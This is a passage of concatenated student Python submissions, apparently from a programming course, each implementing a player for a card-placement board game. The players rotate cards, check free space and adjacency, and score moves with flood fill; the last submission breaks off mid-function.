    minarsar
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/minarsar______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Cheryl"

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        
        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]

        if len(self.cardsAtHand) == 0:
            return []

        R,C = self.boardRows,self.boardCols

        board = [['*']*C for _ in range(R)]

        M = self.cardsOnDesk
        N = self.cardsAtHand
        
        if M != []:
            for m in M:
                start_row,start_col = m[0],m[1]
                card = m[2]
                self.place_card(card,start_row,start_col,board)

        if M == []:
            x = self.first_card() 
            return x
        for n in N:
            card = n
            rows,cols = len(card),len(card[0])

            
            
            for _ in range(4):
                for start_row in range(R-rows+1):
                    for start_col in range(C-cols+1):
                        if self.can_place(card,rows,cols,start_row,start_col,board) and self.is_touching(card,start_row,start_col,rows,cols,board):
                            self.place_card(card,start_row,start_col,board)
                            self.cardsAtHand = self.cardsAtHand[:N.index(n)] + self.cardsAtHand[N.index(n)+1:]  #remove selected card so its not used in future
                            self.cardsOnDesk += [ [start_row, start_col, card ] ]
                            return [start_row, start_col, card ]
                card = self.rotation(card,rows,cols)
                rows,cols = cols,rows

        return []
        
    def is_inside(self,row,col):
        R,C = self.boardRows,self.boardCols
        return 0 <= row < R and 0 <= col < C

    def rotation(self,card,rows,cols):
        rotated = [[0]*rows for _ in range(cols)]
        for r in range(rows):
            for c in range(cols):
                rotated[c][rows-1-r] = card[r][c]
        return rotated
        
    def can_place(self,card,rows,cols,start_row,start_col,board):
        for r in range(rows):
            for c in range(cols):
                if board[start_row+r][start_col+c] != '*':
                    return False
        return True

    def place_card(self,card,start_row,start_col,board):
        rows,cols = len(card),len(card[0])
        for r in range(rows):
            for c in range(cols):
                board[start_row+r][start_col+c] = card[r][c]

    def is_touching(self,card,start_row,start_col,rows,cols,board):
        for r in range(rows):
            for c in range(cols):
                for dir_r,dir_c in [(-1,0),(1,0),(0,-1),(0,1)]:
                    new_r,new_c = start_row+r+dir_r,start_col+c+dir_c
                    if self.is_inside(new_r,new_c) and board[new_r][new_c] != '*':
                        return True
        return False

    def first_card(self):
        cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
        card = self.cardsAtHand[cardindx]
        cardRows = len(card)
        cardCols = len(card[0])
        row = random.randint(0, self.boardRows-cardRows-1) 
        col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row,col, card ] ]
        return [row,col,card]




if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    hanakal3
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/hanakal3______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Kopretinka"
        self.rozmer_deska = [boardRows, boardCols]
        self.mam = cardsAtHand
        self.cardsOnDesk = []
        self.deska = []
        for r in range(self.rozmer_deska[0]):
            self.deska.append(["o"] * self.rozmer_deska[1])

    def PM(self, a):
        for i in range(len(a)):
            for j in range(len(a[i])):
                print(a[i][j], end=" ")
            print()

    def rotace(self, a):
        rotace = []
        for r in range(len(a[0])):
            rotace.append([0] * len(a))
        for r in range(len(a)):
            for c in range(len(a[0])):
                rotace[c][len(rotace[c])-1 - r] = a[r][c]
        return rotace

    def rotace2(self, a):
        rotace = self.rotace(a)
        rotace = self.rotace(rotace)
        return rotace

    def rotace3(self, a):
        rotace = self.rotace2(a)
        rotace = self.rotace(rotace)
        return rotace
    
    def volno_1(self, karta, policko):
        if len(karta) <= len(self.deska)-policko[0] and len(karta[0]) <= len(self.deska[0])-policko[1]:
            for r in range(len(karta)):
                for c in range(len(karta[0])):
                    if self.deska[policko[0] + r][policko[1] + c] != "o":
                        return False
            return True
        return False
    def volno_2(self, karta, policko):
        if len(karta) <= len(self.deska)-policko[0] and len(karta[0]) <= policko[1]+1:
            for r in range(len(karta)):
                for c in range(len(karta[0])):
                    if self.deska[policko[0] + r][policko[1] - c] != "o":
                        return False
            return True
        return False
    def volno_3(self, karta, policko):
        if len(karta) <= policko[0]+1 and len(karta[0]) <= policko[1]+1:
            for r in range(len(karta)):
                for c in range(len(karta[0])):
                    if self.deska[policko[0] - r][policko[1] - c] != "o":
                        return False
            return True
        return False
    def volno_4(self, karta, policko):
        if len(karta) <= policko[0]+1 and len(karta[0]) <= len(self.deska[0])-policko[1]:
            for r in range(len(karta)):
                for c in range(len(karta[0])):
                    if self.deska[policko[0] - r][policko[1] + c] != "o":
                        return False
            return True
        return False

    def umisti(self):
        index = 0
        moznosti = []
        for karta in self.mam:

            for hrana in self.volna_hrana:
                policko = hrana[:]
                if self.volno_1(karta, policko):
                    moznosti.append([[policko[0], policko[1], karta], index])
                if self.volno_1(self.rotace(karta), policko):
                    moznosti.append([[policko[0], policko[1], self.rotace(karta)], index])
                if self.volno_1(self.rotace2(karta), policko):
                    moznosti.append([[policko[0], policko[1], self.rotace2(karta)], index])
                if self.volno_1(self.rotace3(karta), policko):
                    moznosti.append([[policko[0], policko[1], self.rotace3(karta)], index])

                if self.volno_2(karta, policko):
                    sloupec = policko[1] - len(karta[0]) +1
                    moznosti.append([[policko[0], sloupec, karta], index])
                if self.volno_2(self.rotace(karta), policko):
                    sloupec = policko[1] - len(karta) +1
                    moznosti.append([[policko[0], sloupec, self.rotace(karta)], index])
                if self.volno_2(self.rotace2(karta), policko):
                    sloupec = policko[1] - len(karta[0]) +1
                    moznosti.append([[policko[0], sloupec, self.rotace2(karta)], index])
                if self.volno_2(self.rotace3(karta), policko):
                    sloupec = policko[1] - len(karta) +1
                    moznosti.append([[policko[0], sloupec, self.rotace3(karta)], index])

                if self.volno_3(karta, policko):
                    sloupec = policko[1] - len(karta[0]) +1
                    radek = policko[0] - len(karta) +1
                    moznosti.append([[radek, sloupec, karta], index])
                if self.volno_3(self.rotace(karta), policko):
                    sloupec = policko[1] - len(karta) +1
                    radek = policko[0] - len(karta[0]) +1
                    moznosti.append([[radek, sloupec, self.rotace(karta)], index])
                if self.volno_3(self.rotace2(karta), policko):
                    sloupec = policko[1] - len(karta[0]) +1
                    radek = policko[0] - len(karta) +1
                    moznosti.append([[radek, sloupec, self.rotace2(karta)], index])
                if self.volno_3(self.rotace3(karta), policko):
                    sloupec = policko[1] - len(karta) +1
                    radek = policko[0] - len(karta[0]) +1
                    moznosti.append([[radek, sloupec, self.rotace3(karta)], index])

                if self.volno_4(karta, policko):
                    radek = policko[0] - len(karta) +1
                    moznosti.append([[radek, policko[1], karta], index])
                if self.volno_4(self.rotace(karta), policko):
                    radek = policko[0] - len(karta[0]) +1
                    moznosti.append([[radek, policko[1], self.rotace(karta)], index])
                if self.volno_4(self.rotace2(karta), policko):
                    radek = policko[0] - len(karta) +1
                    moznosti.append([[radek, policko[1], self.rotace2(karta)], index])
                if self.volno_4(self.rotace3(karta), policko):
                    radek = policko[0] - len(karta[0]) +1
                    moznosti.append([[radek, policko[1], self.rotace3(karta)], index])
            index += 1
        return moznosti

    def nejlepsi(self, vsechny_moznosti):
        nejlepsi_karta = vsechny_moznosti[0]
        maxbody = 0
        for moznost in vsechny_moznosti:
            karta = moznost[0]
            body = 0
            if karta[0] -1 >= 0:
                for i in range(len(karta[2][0])):
                    if karta[2][0][i] == self.deska[karta[0]-1][karta[1]+i] and karta[2][0][i] != 0:
                        body += 1
            if karta[0] + len(karta[2]) <= self.rozmer_deska[0] - 1:
                for i in range(len(karta[2][0])):
                    if karta[2][len(karta[2])-1][i] == self.deska[karta[0] + len(karta[2])][karta[1]+i] and karta[2][len(karta[2])-1][i] != 0:
                        body += 1
            if karta[1] -1 >= 0:
                for i in range(len(karta[2])):
                    if karta[2][i][0] == self.deska[karta[0] + i][karta[1] -1] and karta[2][i][0] != 0:
                        body += 1
            if karta[1] + len(karta[2][0]) <= self.rozmer_deska[1] - 1:
                for i in range(len(karta[2])):
                    if karta[2][i][len(karta[2][0])-1] == self.deska[karta[0] + i][karta[1] + len(karta[2][0])] and karta[2][i][len(karta[2][0])-1] != 0:
                        body += 1
            if body > maxbody:
                nejlepsi_karta = moznost
                maxbody = body
        return nejlepsi_karta


    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move, or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        volno = False
        if newCardOnDesk == []:
            if any(int in row for row in self.deska):
                pass
            else:
                self.volna_hrana = [[int(self.rozmer_deska[0]/2), int(self.rozmer_deska[1]/2)], [0,0]]
                volno = True

        else:
            karta = newCardOnDesk
            self.cardsOnDesk.append(karta)
            for r in range(len(karta[2])):
                for c in range(len(karta[2][0])):
                    self.deska[karta[0]+r][karta[1]+c] = karta[2][r][c]
        
        if self.mam != [] and volno == False:
            self.volna_hrana = []
            for r in range(self.rozmer_deska[0]):
                for c in range(self.rozmer_deska[1]):
                    if self.deska[r][c] == "o":
                        for sousedi in [[1,0],[0,1],[-1,0],[0,-1]]:
                            if r + sousedi[0] in range(self.rozmer_deska[0]) and c + sousedi[1] in range(self.rozmer_deska[1]):
                                if self.deska[r + sousedi[0]][c + sousedi[1]] != "o":
                                    self.volna_hrana.append([r,c])
                                    break

        vsechny_moznosti = self.umisti()

        if vsechny_moznosti == []:
            return[]
        else:
            vysledek = self.nejlepsi(vsechny_moznosti)
            karta = vysledek[0]
            for r in range(len(karta[2])):
                for c in range(len(karta[2][0])):
                    self.deska[karta[0]+r][karta[1]+c] = karta[2][r][c]
            self.cardsOnDesk.append(karta)
            self.mam.pop(vysledek[1])
            return karta


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()    horakada
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/horakada______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"
        self.empty_space = 7
        self.num_cards = len(self.cardsAtHand)
        self.board = self.init_board(self.boardRows, self.boardCols)

    def init_board(self, boardRows, boardCols):
        board = []
        for row in range(boardRows):
            board.append([self.empty_space]*boardCols)
            #print(board[row])
        return board

    def cardPlacement(self, board, card_move):
        card_row = card_move[0]
        card_col = card_move[1]
        card = card_move[2]
        card_dim = [len(card), len(card[0])]

        for row in range(card_dim[0]):
            for col in range(card_dim[1]):
                board[card_row + row][card_col + col] = card[row][col]

    def cardDisplacement(self, board, card_move):
        card_row = card_move[0]
        card_col = card_move[1]
        card = card_move[2]
        card_dim = [len(card), len(card[0])]

        for row in range(card_dim[0]):
            for col in range(card_dim[1]):
                board[card_row + row][card_col + col] = self.empty_space

    def playingCard(self, cardsAtHand, newCardOnDesk):
        card_move = []

        if newCardOnDesk == [] and len(self.cardsAtHand) == self.num_cards:
                current_card = cardsAtHand[0]
                card_move.append(0)
                card_move.append(0)
                card_move.append(current_card)
                self.cardPlacement(self.board, card_move)
                self.cardsAtHand = self.cardsAtHand[:0] + self.cardsAtHand[0 + 1:]
                return card_move
        
        max_card = []
        max_res = 0
        move_exist = False
        
        for i in range(len(cardsAtHand)):
            first = True
            for _ in range(4):
                current_card = cardsAtHand[i]
                if first == False:
                    current_card = self.cardRotateRight(current_card)
                spaces = self.playableSpaces(self.board, current_card)
                first = False
                if spaces != []:
                    space_x, space_y = spaces[0]
                    safe_card = current_card
                    safe_index = i
                    for space in spaces:
                        card_move = []
                        x, y = space
                        card_move.append(x)
                        card_move.append(y)
                        card_move.append(current_card)
                        res, res_card = self.boardSetupForFlood(self.board, card_move)
                        if res != 0:
                            if res > max_res:
                                move_exist = True
                                max_res = res
                                max_card = card_move
                                max_index = i
                                #print(max_card)
                elif i != (len(cardsAtHand)-1):
                    break
                elif i == (len(cardsAtHand)-1) and move_exist == False:
                    return []               

        if max_card == []:
            max_card.append(space_x)
            max_card.append(space_y)
            max_card.append(safe_card)
            max_index = safe_index
            #print(max_card)
        self.cardPlacement(self.board, max_card)
        self.cardsAtHand = self.cardsAtHand[:max_index] + self.cardsAtHand[max_index + 1:]
        return max_card
        
    def playableSpaces(self, board, current_card):
        board_row_prop = len(board)
        board_col_prop = len(board[0])

        card_row_prop = len(current_card)
        card_col_prop = len(current_card[0])

        count = 0
        no_space = False
        over_col = False
        over_row = False
        touches = False
        playable_spaces = []
        for board_row in range(board_row_prop):
            if over_row == True:
                break
            
            over_col = False
            for board_col in range(board_col_prop):
                if over_col or over_row == True:
                    break

                if count == card_row_prop * card_col_prop and touches == True:
                    #print(board_row, board_col - 1)
                    playable_spaces.append((board_row, board_col -1))

                count = 0
                no_space = False
                touches = False

                for card_row in range(card_row_prop):
                    if no_space == True:
                        break
                    if over_col or over_row == True:
                        break
                    for card_col in range(card_col_prop):
                        if (board_col + card_col) >= board_col_prop:
                            over_col = True
                            break
                        if (board_row + card_row) >= board_row_prop:
                            over_row = True
                            break
                        if board[board_row + card_row][board_col + card_col] == self.empty_space:
                            count += 1
                        else:
                            no_space = True
                            break
                        for direction in [(-1, 0), (0, 1), (1, 0), (0, -1)]:
                            touch_row, touch_col = direction
                            if (board_row + card_row + touch_row) >= board_row_prop or (board_row + card_row + touch_row) <= -1:
                                continue
                            if (board_col + card_col + touch_col) >= board_col_prop or (board_col + card_col + touch_col) <= -1:
                                continue
                            if board[board_row + card_row + touch_row][board_col + card_col + touch_col] != self.empty_space:
                                touches = True

        return playable_spaces

    def cardRotateRight(self, current_card):
        card_row = len(current_card)
        card_col = len(current_card[0])

        rotated_card_mat = [[0] * card_row for _ in range(card_col)]
        for row in range(card_row):
            for col in range(card_col):
                rotated_card_mat[col][card_row - row - 1] = current_card[row][col]

        return rotated_card_mat
    
    def isInside(self, a, r, c):
        #return true if (r, c) is inside a
        return r >= 0 and r < len(a) and c >= 0 and c < len(a[0])

    def floodFill(self, a, r, c, colour): #colour - colour for floodfill
        count = 0
        
        stack = [ [r, c] ]
        N = [[-1, 0], [0, -1], [0, 1], [1, 0]]
        while len(stack) > 0:
            r, c = stack.pop()
            if a[r][c] == colour:
                a[r][c] = -(colour)
                count += 1
                for neighbour in N:
                    rowO, colO = neighbour
                    row = r + rowO
                    col = c + colO
                    if self.isInside(a, row, col) and a[row][col] == colour:
                        stack.append([row, col])

        return count

    def boardSetupForFlood(self, board, card_move):
        max_res = 0
        max_card = []
        
        self.cardPlacement(board, card_move)
        res = self.usingFlood(board, card_move)
        self.cardDisplacement(board, card_move)
        if res != []:
            tmp_res = 0
            for i in range(len(res)):
                tmp_res += res[i][1]
            if max_res == 0 or tmp_res > max_res:
                max_res = tmp_res
                max_card = card_move
            
        return max_res, max_card

    def usingFlood(self, board, card_move):
        card_r1 = card_move[0]
        card_c1 = card_move[1]
        card_row = len(card_move[2])
        card_col = len(card_move[2][0])
        #print(card_row, card_col)
        card_mat = card_move[2]

        card_res_mat = []
        for row in range(card_row):
            for col in range(card_col):
                if card_mat[row][col] != 0:
                    colour = card_mat[row][col]
                    res = self.floodFill(card_mat, row, col, colour)
                    """
                    for row_reset in range(card_row):
                        for col_reset in range(card_col):
                            if card_mat[row_reset][col_reset] < 0:
                                card_mat[row_reset][col_reset] = -(card_mat[row_reset][col_reset])
                    """ 
                    #"""
                    done = False
                    for row_reset in range(card_row):
                        if done == True:
                            break
                        for col_reset in range(card_col):
                            if card_mat[row_reset][col_reset] < 0:
                                colour_reset = card_mat[row_reset][col_reset]
                                self.floodFill(card_mat, row_reset, col_reset, colour_reset)
                                done = True
                                break
                    #"""
                            
                    if res != 0:
                        card_res_mat.append([colour, res])
        #print(card_res_mat)

        res_mat = []
        for row in range(card_row):
            for col in range(card_col):
                if card_mat[row][col] != 0:
                    colour = card_mat[row][col]
                    res = self.floodFill(board, card_r1 + row, card_c1 + col, colour)
                    """
                    for row_reset in range(len(board)):
                        for col_reset in range(len(board[0])):
                            if board[row_reset][col_reset] < 0:
                                board[row_reset][col_reset] = -(board[row_reset][col_reset])
                    """
                    #"""
                    done = False
                    for row_reset in range(len(board)):
                        if done == True:
                            break
                        for col_reset in range(len(board[0])):
                            if board[row_reset][col_reset] < 0:
                                colour_reset = board[row_reset][col_reset]
                                self.floodFill(board, row_reset, col_reset, colour_reset)
                                done = True
                                break
                    #"""
                    
                    if res != 0:
                        res_mat.append([colour, res])
        #print(res_mat)

        final = []
        for i in range(len(res_mat)):
            if card_res_mat[i] != res_mat[i]:
                final.append(res_mat[i])
        
        return final

    def play(self,newCardOnDesk):
        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
            self.cardPlacement(self.board, newCardOnDesk)
        
        if len(self.cardsAtHand) == 0:
            return []
        
        card_move = self.playingCard(self.cardsAtHand, newCardOnDesk)
        self.cardsOnDesk += [ card_move ]
        return card_move

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            for line in range(len(p2.board)):
                print(p2.board[line])
            quit()    zahraj19
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/zahraj19______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

def DebugPrint(grid : list):
    key = {-1:chr(11035), 0:chr(11036), 1:chr(128997), 2:chr(128999), 3:chr(129000), 4:chr(129001), 5:chr(129002), 6:chr(129003), 7:chr(128992), 8:chr(128993), 9:chr(128994), 10:chr(128995), 11:chr(128996)}
    for line in grid:
        for cell in line:
            print(key[cell], end="")
        print()

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

class Card():
    """Holds a single card, used for cards that are in hand and not on the board. Indexing of grid is [line][column].
    Has attributes top_left : tuple, grid : list, .
    Made to hold cards that are not yet played, so for cards on board, the line should be shortened."""
    def __init__(self, card : list, top_left : tuple = (None, None)):
        # print(card)
        
        self.top_left = top_left

        self.grid = copy.deepcopy(card)
        # for i in range(len(line[2:])):
        #     self.grid[i//line[1]].append(line[i+2])

        self.height = len(self.grid)
        self.width = len(self.grid[0])
    
    def add_visited(self):
        """A separate function, because visited and colour_amounts are needed only for cards not yet placed."""
        self.visited = [[False for _ in range(self.width)] for _ in range(self.height)]
        self.colour_amounts = {}
        for i in range(self.height):
            for j in range(self.width):
                if self.visited[i][j] == False and self.grid[i][j] != 0:
                    connected = self.flood_fill((i,j), self.grid[i][j])
                    if self.grid[i][j] not in self.colour_amounts.keys():
                        self.colour_amounts[self.grid[i][j]] = connected
                    else:
                        self.colour_amounts[self.grid[i][j]] += connected
        
        self.reset_visited()

    def reset_visited(self):
        """Sets visited back to an all False field."""
        for i in range(self.height):
            for j in range(self.width):
                self.visited[i][j] = False

    def rotate_clockwise(self):
        """Rotates the self.grid 2D list clockwise by 90 degrees."""
        new_grid = [[] for _ in range(len(self.grid[0]))]
        for r in range(len(self.grid)):
            for c in range(len(self.grid[0])):
                new_grid[c].insert(0, self.grid[r][c])
        self.grid = copy.deepcopy(new_grid)
        self.width, self.height = self.height, self.width
        self.visited = [[False for _ in range(self.width)] for _ in range(self.height)]
        #only not placed cards are rotated, so I can assume any rotated card already has the visited field
        
    def flood_fill(self, start : tuple, colour : int) -> int:
        """Finds largest connected colour area using floodfill. Sets visited tiles to True in self.visited."""
        queue = [start]
        known = set()
        known.add(start)
        counter = 0

        while len(queue) > 0:
            pos = queue.pop(0)
            self.visited[pos[0]][pos[1]] = True
                
            counter += 1

            if pos[0] != 0 and (pos[0]-1, pos[1]) not in known and self.grid[pos[0]-1][pos[1]] == colour: #checks up
                queue.append((pos[0]-1, pos[1]))
                known.add((pos[0]-1, pos[1]))
                
            if pos[0] != self.height-1 and (pos[0]+1, pos[1]) not in known and self.grid[pos[0]+1][pos[1]] == colour: #checks down
                queue.append((pos[0]+1, pos[1]))
                known.add((pos[0]+1, pos[1]))

            if pos[1] != 0 and (pos[0], pos[1]-1) not in known and self.grid[pos[0]][pos[1]-1] == colour: #checks left
                queue.append((pos[0], pos[1]-1))
                known.add((pos[0], pos[1]-1))

            if pos[1] != self.width-1 and (pos[0], pos[1]+1) not in known  and self.grid[pos[0]][pos[1]+1] == colour: #checks right
                queue.append((pos[0], pos[1]+1))
                known.add((pos[0], pos[1]+1))

        return counter

    def find_symmetry(self):
        """Finds top/bottom and left/right symmetry."""
        pass

    def sum_potential(self):
        """Returns how many coloured tiles are on this card."""
        sum = 0
        for i in self.colour_amounts:
            sum += self.colour_amounts[i]
        return sum

    def __repr__(self):
        out = ""
        for i in self.grid:
            out += str(i)
            out += "\n"
        return out[:-1]

class Board():
    """Holds the entire playing board. If a cell has the value -1, it's empty. Indexing of board 2D list is
    [line][column].
    Has attributes lines, columns, on_board (amount of cards on board), in_hand (amount of cards in hand) and board
    (the current state of the board, a 2D grid)."""
    def __init__(self, rows : int, cols : int, cards : list):
        # counter = 0
        self.played_cards : list = []
        self.available_cards : list = []
        self.lines, self.columns = rows, cols
        for i in range(len(cards)):
            self.available_cards.append(Card(cards[i]))
            self.available_cards[-1].add_visited()

        self.board = [[-1 for _ in range(self.columns)] for _ in range(self.lines)]


    def best_play(self, card : Card, top_score : int) -> tuple:
        """Finds if there is an available space to play a card. Also returns the amount of points gained by the play."""
        w = card.width
        h = card.height
        best_top_left = None

        # DebugPrint(card.grid)
        # print("attempts")

        for played in self.played_cards:
            # DebugPrint(played.grid)
            if played.top_left[1] >= w: #checks if card can be put left on an empty board
                # print("put left")
                top = played.top_left[0] - h + 1 #gets the highest height at which the cards would still touch upon placement
                if top < 0:
                   top = 0
                no_lower = False
                while top <= played.top_left[0] + played.height - 1 and no_lower == False: #moves the top down and down until the cards stop touching
                    skip = False
                    for i in range(w): #looks through the surrounding area, moving column by column
                        if skip == True:
                            break
                        for j in range(h):
                            if top+j >= self.lines:
                                no_lower = True
                                skip = True
                                break
                            if self.board[top + j][played.top_left[1]-w+i] != -1: #checks the tile, whether it is occupied
                                skip = True
                                break
                            
                    if skip == False:
                        all_scores = 0 #holds the total amount of points gained by this placement
                        #place the card so I can call floodfill on it
                        top_left = (top, played.top_left[1]-w) #might be wrong
                        for i in range(card.height):
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = card.grid[i][j]
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                if card.grid[i][j] != 0 and card.visited[i][j] != True:
                                    connected = self.flood_fill((top_left[0]+i, top_left[1]+j), card.grid[i][j], card, top_left)
                                    if connected[1] == True:
                                        all_scores += connected[0]

                        # print(all_scores)
                        if all_scores > top_score:
                            top_score = all_scores
                            best_top_left = top_left
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = -1
                        
                        card.reset_visited()
                    
                    top += 1


            if self.columns - played.top_left[1] - played.width >= w: #checks if card can be put right on an empty board
                # print("put right")
                top = played.top_left[0] - h + 1
                if top < 0:
                    top = 0
                no_lower = False
                while top <= played.top_left[0] + played.height - 1 and no_lower == False:
                    skip = False
                    for i in range(w): #looks through the surrounding area, moving column by column
                        if skip == True:
                            break
                        for j in range(h):
                            if top+j >= self.lines: #can't go any lower, so we break the cycle
                                no_lower = True
                                skip = True
                                break
                            if self.board[top + j][played.top_left[1]+played.width+i] != -1: #checks the tile, whether it is occupied
                                skip = True
                                break
                    
                    if skip == False:
                        all_scores = 0 #holds the total amount of points gained by this placement
                        #place the card so I can call floodfill on it
                        top_left = (top, played.top_left[1]+played.width) #might be wrong
                        for i in range(card.height):
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = card.grid[i][j]
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                if card.grid[i][j] != 0 and card.visited[i][j] != True:
                                    connected = self.flood_fill((top_left[0]+i, top_left[1]+j), card.grid[i][j], card, top_left)
                                    if connected[1] == True:
                                        all_scores += connected[0]

                        # print(all_scores)
                        if all_scores > top_score:
                            top_score = all_scores
                            best_top_left = top_left
                        
                        for i in range(card.height):
                            for j in range(card.width):
                                self.board[top_left[0]+i][top_left[1]+j] = -1
                        
                        card.reset_visited()
                    
                    top += 1

            if played.top_left[0] >= h: #checks if card can be put above on an empty board
                # print("put above")
                left = played.top_left[1] - w + 1
                if left < 0:
                    left = 0
                no_right = False
                # moves from left to right
